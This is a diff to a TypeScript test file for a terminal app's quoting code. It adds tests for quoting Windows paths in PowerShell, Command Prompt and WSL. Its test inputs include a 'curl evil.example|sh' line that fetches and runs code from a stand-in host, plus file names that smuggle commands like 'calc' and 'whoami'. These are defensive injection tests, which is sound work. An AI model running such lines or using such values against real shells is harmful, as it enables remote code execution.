@@ -3,7 +3,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
 import { existsSync } from "node:fs";
-import { cleanPaste, PASTE_ASK_ALWAYS, pasteLines, pasteNeedsConfirm, pastePreview, pasteView, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";
+import { cdLine, cleanPaste, PASTE_ASK_ALWAYS, quoteAs, wslPath, pasteLines, pasteNeedsConfirm, pastePreview, pasteView, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";
 
 test("pasted text can't end the bracketed paste early", () => {
   const evil = "ls\x1b[201~\ncurl evil.example|sh\n";
@@ -134,4 +134,37 @@ test("a cut never splits a surrogate pair or a CRLF", () => {
   const w = pasteView(crlf);
   assert.equal(w.lines, 30_000);
   assert.equal(w.head.split("\n").length - 1 + w.cutLines + (w.tail.split("\n").length - 1), 30_000);
+});
+
+test("paths are quoted for each shell on Windows", () => {
+  // PowerShell: single quotes, each quote (curly ones too) doubled; $ and ` stay literal
+  assert.equal(quoteAs("powershell", "C:\\Users\\a\\b.txt"), "C:\\Users\\a\\b.txt");
+  assert.equal(quoteAs("powershell", "C:\\x' ; calc ; '"), "'C:\\x'' ; calc ; '''");
+  assert.equal(quoteAs("powershell", "C:\\a\u2019b $env:X `c"), "'C:\\a\u2019\u2019b $env:X `c'");
+  // Command Prompt: double quotes, and a name with % or " refused
+  assert.equal(quoteAs("cmd", "C:\\My Files\\a&b"), '"C:\\My Files\\a&b"');
+  assert.equal(quoteAs("cmd", "C:\\100%\\x"), null);
+  assert.equal(quoteAs("cmd", 'C:\\a"&calc&"'), null);
+  // WSL: the /mnt path, POSIX-quoted
+  assert.equal(quoteAs("wsl", "C:\\My Files\\it's"), "'/mnt/c/My Files/it'\\''s'");
+  // a line break or control character never goes in, whatever the shell
+  for (const q of ["posix", "powershell", "cmd", "wsl"] as const) assert.equal(quoteAs(q, "C:\\a\nwhoami"), null);
+});
+
+test("Windows paths as WSL sees them", () => {
+  assert.equal(wslPath("C:\\Users\\a"), "/mnt/c/Users/a");
+  assert.equal(wslPath("D:/x/"), "/mnt/d/x");
+  assert.equal(wslPath("C:\\"), "/mnt/c");
+  assert.equal(wslPath("C:"), "/mnt/c");
+  assert.equal(wslPath("\\\\wsl$\\Ubuntu\\home\\me"), "/home/me");
+  assert.equal(wslPath("\\\\wsl.localhost\\Debian"), "/");
+  // drive-relative and network paths can't be reached that way
+  assert.equal(wslPath("C:foo"), null);
+  assert.equal(wslPath("\\\\server\\share\\x"), null);
+});
+
+test("the cd line suits each shell", () => {
+  assert.equal(cdLine("powershell", "'C:\\a b'"), " Set-Location -LiteralPath 'C:\\a b'\r");
+  assert.equal(cdLine("cmd", '"C:\\a b"'), ' cd /d "C:\\a b"\r');
+  assert.equal(cdLine("posix", "'/a b'"), " cd '/a b'\r");
 });
